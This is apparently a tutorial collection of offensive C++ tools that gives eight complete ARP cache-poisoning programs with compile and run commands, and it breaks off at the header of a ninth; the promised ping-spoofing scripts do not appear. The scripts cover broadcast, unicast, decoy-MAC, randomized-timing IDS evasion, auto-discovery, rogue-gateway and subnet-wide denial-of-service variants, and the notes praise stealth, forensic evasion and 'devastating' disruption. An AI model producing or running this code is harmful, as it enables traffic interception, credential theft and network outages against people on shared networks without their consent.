# 10 ARP Reply Attacks + 10 Fake Ping Reply Attacks in C++

Each script demonstrates a distinct technique with compile instructions.

---

# PART 1: ARP Reply Attacks (10 Scripts)

---

### 1. Basic Gratuitous ARP Reply Flood
```cpp
// Compile: g++ -o arp_reply_basic arp_reply_basic.cpp
// Run: sudo ./arp_reply_basic <interface> <spoofed_ip> <attacker_mac>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>

class BasicARPReplyFlood {
private:
    int sock;
    std::string iface;
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
public:
    BasicARPReplyFlood(const std::string& i) : iface(i) {
        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        if (sock < 0) { perror("socket"); exit(1); }
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_protocol = htons(ETH_P_ARP);
        bind(sock, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    // Send gratuitous ARP reply to broadcast
    void sendGratuitous(const std::string& spoofedIP, const std::string& attackerMAC) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        // Broadcast destination
        memset(eth->ether_dhost, 0xFF, 6);
        macToBytes(attackerMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(attackerMAC, arp->arp_sha);
        inet_pton(AF_INET, spoofedIP.c_str(), arp->arp_spa);
        memset(arp->arp_tha, 0x00, 6);  // Unknown
        inet_pton(AF_INET, spoofedIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memset(sll.sll_addr, 0xFF, 6);
        
        sendto(sock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void run(const std::string& spoofedIP, const std::string& attackerMAC) {
        std::cout << "[*] Gratuitous ARP reply flood\n";
        std::cout << "[*] Spoofing: " << spoofedIP << " -> " << attackerMAC << "\n";
        
        while (true) {
            sendGratuitous(spoofedIP, attackerMAC);
            usleep(500000);  // Every 0.5 sec
        }
    }
    
    ~BasicARPReplyFlood() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <interface> <spoofed_ip> <attacker_mac>\n";
        return 1;
    }
    BasicARPReplyFlood flood(argv[1]);
    flood.run(argv[2], argv[3]);
    return 0;
}
```

**Technique:** Broadcasts unsolicited ARP replies. All hosts on LAN update their cache to associate spoofed IP with attacker MAC.

---

### 2. Unicast ARP Reply Poison
```cpp
// Compile: g++ -o arp_reply_unicast arp_reply_unicast.cpp
// Run: sudo ./arp_reply_unicast <interface> <target_ip> <target_mac> <spoofed_ip> <attacker_mac>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>

class UnicastARPReply {
private:
    int sock;
    std::string iface;
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
public:
    UnicastARPReply(const std::string& i) : iface(i) {
        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        if (sock < 0) { perror("socket"); exit(1); }
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_protocol = htons(ETH_P_ARP);
        bind(sock, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    // Send unicast ARP reply directly to target
    void sendUnicast(const std::string& srcIP, const std::string& srcMAC,
                     const std::string& dstIP, const std::string& dstMAC) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        macToBytes(dstMAC, eth->ether_dhost);
        macToBytes(srcMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(srcMAC, arp->arp_sha);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
        macToBytes(dstMAC, arp->arp_tha);
        inet_pton(AF_INET, dstIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memcpy(sll.sll_addr, eth->ether_dhost, 6);
        
        sendto(sock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void run(const std::string& targetIP, const std::string& targetMAC,
             const std::string& spoofedIP, const std::string& attackerMAC) {
        std::cout << "[*] Unicast ARP poison: " << targetIP << "\n";
        std::cout << "[*] Telling target: " << spoofedIP << " is at " 
                  << attackerMAC << "\n";
        
        while (true) {
            sendUnicast(spoofedIP, attackerMAC, targetIP, targetMAC);
            usleep(500000);
        }
    }
    
    ~UnicastARPReply() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 6) {
        std::cerr << "Usage: " << argv[0] 
                  << " <interface> <target_ip> <target_mac> <spoofed_ip> <attacker_mac>\n";
        return 1;
    }
    UnicastARPReply reply(argv[1]);
    reply.run(argv[2], argv[3], argv[4], argv[5]);
    return 0;
}
```

**Technique:** Directly unicast ARP reply to target. Quieter than broadcast — only target's cache is poisoned. Not visible to IDS monitoring whole subnet.

---

### 3. ARP Reply with MAC Spoofing (Decoy MAC)
```cpp
// Compile: g++ -o arp_reply_decoy arp_reply_decoy.cpp
// Run: sudo ./arp_reply_decoy <interface> <target_ip> <target_mac> <spoofed_ip> <decoy_mac>
// Requires: root privileges + promiscuous mode

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>

class DecoyMACARPReply {
private:
    int sock;
    std::string iface;
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
public:
    DecoyMACARPReply(const std::string& i) : iface(i) {
        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        if (sock < 0) { perror("socket"); exit(1); }
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_protocol = htons(ETH_P_ARP);
        bind(sock, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    // Use decoy MAC in ARP reply - real attacker MAC never appears
    void sendDecoy(const std::string& srcIP, const std::string& decoyMAC,
                   const std::string& dstIP, const std::string& dstMAC) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        macToBytes(dstMAC, eth->ether_dhost);
        macToBytes(decoyMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(decoyMAC, arp->arp_sha);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
        macToBytes(dstMAC, arp->arp_tha);
        inet_pton(AF_INET, dstIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memcpy(sll.sll_addr, eth->ether_dhost, 6);
        
        sendto(sock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void run(const std::string& targetIP, const std::string& targetMAC,
             const std::string& spoofedIP, const std::string& decoyMAC) {
        std::cout << "[*] Decoy MAC ARP reply attack\n";
        std::cout << "[*] Victim will cache: " << spoofedIP 
                  << " @ " << decoyMAC << " (fake)\n";
        std::cout << "[!] Enable promiscuous mode: sudo ip link set " 
                  << iface << " promisc on\n";
        
        while (true) {
            sendDecoy(spoofedIP, decoyMAC, targetIP, targetMAC);
            usleep(500000);
        }
    }
    
    ~DecoyMACARPReply() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 6) {
        std::cerr << "Usage: " << argv[0] 
                  << " <interface> <target_ip> <target_mac> <spoofed_ip> <decoy_mac>\n";
        return 1;
    }
    DecoyMACARPReply reply(argv[1]);
    reply.run(argv[2], argv[3], argv[4], argv[5]);
    return 0;
}
```

**Technique:** Uses decoy MAC instead of real attacker MAC. Victim caches fake MAC — attacker must set promiscuous mode to catch return traffic. Forensics show decoy, not attacker.

---

### 4. ARP Reply with Gratuitous + Unicast Combo
```cpp
// Compile: g++ -o arp_reply_combo arp_reply_combo.cpp
// Run: sudo ./arp_reply_combo <interface> <target_ip> <target_mac> <spoofed_ip> <attacker_mac>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>

class ComboARPReply {
private:
    int sock;
    std::string iface;
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
    void sendARP(const std::string& srcIP, const std::string& srcMAC,
                 const std::string& dstIP, const std::string& dstMAC,
                 bool broadcast) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        if (broadcast) {
            memset(eth->ether_dhost, 0xFF, 6);
        } else {
            macToBytes(dstMAC, eth->ether_dhost);
        }
        macToBytes(srcMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(srcMAC, arp->arp_sha);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
        macToBytes(dstMAC, arp->arp_tha);
        inet_pton(AF_INET, dstIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        if (broadcast) {
            memset(sll.sll_addr, 0xFF, 6);
        } else {
            memcpy(sll.sll_addr, eth->ether_dhost, 6);
        }
        
        sendto(sock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
public:
    ComboARPReply(const std::string& i) : iface(i) {
        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        if (sock < 0) { perror("socket"); exit(1); }
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_protocol = htons(ETH_P_ARP);
        bind(sock, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    // Broadcast + unicast combination for maximum poisoning
    void run(const std::string& targetIP, const std::string& targetMAC,
             const std::string& spoofedIP, const std::string& attackerMAC) {
        std::cout << "[*] Combo ARP reply (broadcast + unicast)\n";
        std::cout << "[*] Spoofing " << spoofedIP << " -> " << attackerMAC << "\n";
        
        while (true) {
            // Broadcast gratuitous (affects everyone)
            sendARP(spoofedIP, attackerMAC, spoofedIP, "00:00:00:00:00:00", true);
            
            // Direct unicast to target (ensures target updated)
            sendARP(spoofedIP, attackerMAC, targetIP, targetMAC, false);
            
            usleep(500000);
        }
    }
    
    ~ComboARPReply() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 6) {
        std::cerr << "Usage: " << argv[0] 
                  << " <interface> <target_ip> <target_mac> <spoofed_ip> <attacker_mac>\n";
        return 1;
    }
    ComboARPReply reply(argv[1]);
    reply.run(argv[2], argv[3], argv[4], argv[5]);
    return 0;
}
```

**Technique:** Combines gratuitous broadcast + unicast direct to target. Redundant poisoning — target updated even if broadcast is filtered, rest of subnet poisoned as bonus.

---

### 5. ARP Reply with Randomized Timing (Stealth)
```cpp
// Compile: g++ -o arp_reply_stealth arp_reply_stealth.cpp
// Run: sudo ./arp_reply_stealth <interface> <target_ip> <target_mac> <spoofed_ip> <attacker_mac>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <random>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>

class StealthARPReply {
private:
    int sock;
    std::string iface;
    std::mt19937 gen;
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
public:
    StealthARPReply(const std::string& i) : iface(i) {
        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        if (sock < 0) { perror("socket"); exit(1); }
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_protocol = htons(ETH_P_ARP);
        bind(sock, (struct sockaddr*)&sll, sizeof(sll));
        
        std::random_device rd;
        gen = std::mt19937(rd());
    }
    
    void sendStealth(const std::string& srcIP, const std::string& srcMAC,
                     const std::string& dstIP, const std::string& dstMAC) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        macToBytes(dstMAC, eth->ether_dhost);
        macToBytes(srcMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(srcMAC, arp->arp_sha);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
        macToBytes(dstMAC, arp->arp_tha);
        inet_pton(AF_INET, dstIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memcpy(sll.sll_addr, eth->ether_dhost, 6);
        
        sendto(sock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void run(const std::string& targetIP, const std::string& targetMAC,
             const std::string& spoofedIP, const std::string& attackerMAC) {
        std::cout << "[*] Stealth ARP reply (randomized timing)\n";
        std::cout << "[*] Interval: 2-8 seconds (variable)\n";
        
        std::uniform_int_distribution<> dis(2000, 8000);
        
        while (true) {
            sendStealth(spoofedIP, attackerMAC, targetIP, targetMAC);
            
            int delayMs = dis(gen);
            std::cout << "[*] Next poison in " << delayMs << "ms\n";
            usleep(delayMs * 1000);
        }
    }
    
    ~StealthARPReply() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 6) {
        std::cerr << "Usage: " << argv[0] 
                  << " <interface> <target_ip> <target_mac> <spoofed_ip> <attacker_mac>\n";
        return 1;
    }
    StealthARPReply reply(argv[1]);
    reply.run(argv[2], argv[3], argv[4], argv[5]);
    return 0;
}
```

**Technique:** Randomized timing (2-8 seconds) evades regular interval detection. Rate too slow for anomaly thresholds but fast enough to maintain ARP cache (typical timeout is 60s+).

---

### 6. ARP Reply Poisoning with Target Discovery
```cpp
// Compile: g++ -o arp_reply_auto arp_reply_auto.cpp -lpthread
// Run: sudo ./arp_reply_auto <interface> <spoofed_ip> <attacker_mac>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <thread>
#include <atomic>
#include <mutex>
#include <map>
#include <string>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>

class AutoDiscoverARPReply {
private:
    int sock;
    std::string iface;
    std::map<std::string, std::string> discoveredHosts;
    std::mutex mtx;
    std::atomic<bool> running{false};
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
public:
    AutoDiscoverARPReply(const std::string& i) : iface(i) {
        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        if (sock < 0) { perror("socket"); exit(1); }
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_protocol = htons(ETH_P_ARP);
        bind(sock, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    // Passive sniff to discover hosts
    void sniffLoop() {
        uint8_t buffer[1024];
        
        while (running.load()) {
            struct timeval tv;
            tv.tv_sec = 1;
            tv.tv_usec = 0;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            
            int bytes = recv(sock, buffer, sizeof(buffer), 0);
            if (bytes < 42) continue;
            
            struct ether_header* eth = (struct ether_header*)buffer;
            if (ntohs(eth->ether_type) != ETH_P_ARP) continue;
            
            struct ether_arp* arp = (struct ether_arp*)(buffer + 14);
            
            char senderIP[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, arp->arp_spa, senderIP, sizeof(senderIP));
            
            char senderMAC[18];
            snprintf(senderMAC, sizeof(senderMAC),
                     "%02x:%02x:%02x:%02x:%02x:%02x",
                     arp->arp_sha[0], arp->arp_sha[1], arp->arp_sha[2],
                     arp->arp_sha[3], arp->arp_sha[4], arp->arp_sha[5]);
            
            std::lock_guard<std::mutex> lock(mtx);
            if (discoveredHosts.find(senderIP) == discoveredHosts.end()) {
                discoveredHosts[senderIP] = senderMAC;
                std::cout << "[+] Discovered: " << senderIP 
                          << " @ " << senderMAC << "\n";
            }
        }
    }
    
    void sendPoison(const std::string& srcIP, const std::string& srcMAC,
                    const std::string& dstIP, const std::string& dstMAC) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        macToBytes(dstMAC, eth->ether_dhost);
        macToBytes(srcMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(srcMAC, arp->arp_sha);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
        macToBytes(dstMAC, arp->arp_tha);
        inet_pton(AF_INET, dstIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memcpy(sll.sll_addr, eth->ether_dhost, 6);
        
        sendto(sock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void poisonLoop(const std::string& spoofedIP, const std::string& attackerMAC) {
        while (running.load()) {
            std::lock_guard<std::mutex> lock(mtx);
            for (const auto& host : discoveredHosts) {
                sendPoison(spoofedIP, attackerMAC, host.first, host.second);
            }
            usleep(500000);
        }
    }
    
    void run(const std::string& spoofedIP, const std::string& attackerMAC) {
        std::cout << "[*] Auto-discover ARP poisoning\n";
        std::cout << "[*] Sniffing for ARP traffic...\n";
        
        running = true;
        
        std::thread sniffThread(&AutoDiscoverARPReply::sniffLoop, this);
        std::thread poisonThread(&AutoDiscoverARPReply::poisonLoop, this, 
                                  spoofedIP, attackerMAC);
        
        sniffThread.join();
        poisonThread.join();
    }
    
    ~AutoDiscoverARPReply() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <interface> <spoofed_ip> <attacker_mac>\n";
        return 1;
    }
    AutoDiscoverARPReply reply(argv[1]);
    reply.run(argv[2], argv[3]);
    return 0;
}
```

**Technique:** Passively sniffs ARP traffic to discover all hosts, then automatically starts poisoning every discovered host. Zero-configuration attack.

---

### 7. ARP Reply with Multi-IP Poisoning (Rogue Gateway)
```cpp
// Compile: g++ -o arp_reply_multi arp_reply_multi.cpp
// Run: sudo ./arp_reply_multi <interface> <attacker_mac>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>

class MultiIPARPReply {
private:
    int sock;
    std::string iface;
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
    void sendBroadcastARP(const std::string& srcIP, const std::string& srcMAC) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        memset(eth->ether_dhost, 0xFF, 6);
        macToBytes(srcMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(srcMAC, arp->arp_sha);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
        memset(arp->arp_tha, 0, 6);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memset(sll.sll_addr, 0xFF, 6);
        
        sendto(sock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
public:
    MultiIPARPReply(const std::string& i) : iface(i) {
        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        if (sock < 0) { perror("socket"); exit(1); }
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_protocol = htons(ETH_P_ARP);
        bind(sock, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    // Claim MULTIPLE IPs at once (rogue gateway + DNS + NTP)
    void run(const std::string& attackerMAC) {
        // High-value IPs to hijack
        std::vector<std::string> targetIPs = {
            "192.168.1.1",     // Common gateway
            "192.168.1.254",   // Alternate gateway
            "192.168.0.1",     // Alternate gateway
            "10.0.0.1",        // Corporate gateway
            "10.0.0.138",      // Common corporate
            "172.16.0.1",      // Corporate gateway
            "192.168.1.53",    // Common DNS
            "8.8.8.8",         // Google DNS (if local)
            "8.8.4.4",         // Google DNS alt
        };
        
        std::cout << "[*] Multi-IP ARP reply (rogue gateway)\n";
        std::cout << "[*] Claiming " << targetIPs.size() << " IPs\n\n";
        
        for (const auto& ip : targetIPs) {
            std::cout << "    " << ip << " -> " << attackerMAC << "\n";
        }
        std::cout << "\n";
        
        while (true) {
            for (const auto& ip : targetIPs) {
                sendBroadcastARP(ip, attackerMAC);
                usleep(50000);
            }
            usleep(2000000);
        }
    }
    
    ~MultiIPARPReply() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <interface> <attacker_mac>\n";
        return 1;
    }
    MultiIPARPReply reply(argv[1]);
    reply.run(argv[2]);
    return 0;
}
```

**Technique:** Claims multiple high-value IPs simultaneously — gateways, DNS, NTP. Broad MITM coverage with single attack.

---

### 8. ARP Reply with Subnet Spoofing (Claim Entire Subnet)
```cpp
// Compile: g++ -o arp_reply_subnet arp_reply_subnet.cpp
// Run: sudo ./arp_reply_subnet <interface> <attacker_mac> <subnet_prefix>
// Example: sudo ./arp_reply_subnet eth0 00:11:22:33:44:55 192.168.1
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>

class SubnetARPReply {
private:
    int sock;
    std::string iface;
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
    void sendBroadcastARP(const std::string& srcIP, const std::string& srcMAC) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        memset(eth->ether_dhost, 0xFF, 6);
        macToBytes(srcMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(srcMAC, arp->arp_sha);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
        memset(arp->arp_tha, 0, 6);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memset(sll.sll_addr, 0xFF, 6);
        
        sendto(sock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
public:
    SubnetARPReply(const std::string& i) : iface(i) {
        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        if (sock < 0) { perror("socket"); exit(1); }
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_protocol = htons(ETH_P_ARP);
        bind(sock, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    // Claim EVERY IP in /24 subnet
    void run(const std::string& attackerMAC, const std::string& prefix) {
        std::cout << "[*] Subnet-wide ARP reply attack\n";
        std::cout << "[*] Claiming entire " << prefix << ".0/24 subnet\n";
        std::cout << "[*] All IPs will map to " << attackerMAC << "\n\n";
        std::cout << "[!] This will break network connectivity!\n\n";
        
        int round = 0;
        while (true) {
            round++;
            std::cout << "[*] Round " << round << "\n";
            
            for (int i = 1; i <= 254; i++) {
                std::string ip = prefix + "." + std::to_string(i);
                sendBroadcastARP(ip, attackerMAC);
                usleep(20000);  // 20ms between sends
            }
            
            usleep(3000000);  // 3 sec pause
        }
    }
    
    ~SubnetARPReply() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <interface> <attacker_mac> <subnet_prefix>\n";
        return 1;
    }
    SubnetARPReply reply(argv[1]);
    reply.run(argv[2], argv[3]);
    return 0;
}
```

**Technique:** Claims every IP in a /24 subnet via ARP. Complete network DoS. All traffic on the subnet is redirected to attacker. Very noisy but devastating.

---

### 9. ARP Reply with Vendor MAC Spoofing
```cpp
// Compile: g++ -o arp_reply_vendor arp_reply_vendor.cpp
// Run: sudo ./arp_reply_vendor <interface> <target_ip> <target_mac> <spoofed_ip> <vendor>
// Vendors: cisco, juniper, aruba, hp, netgear, tp-link
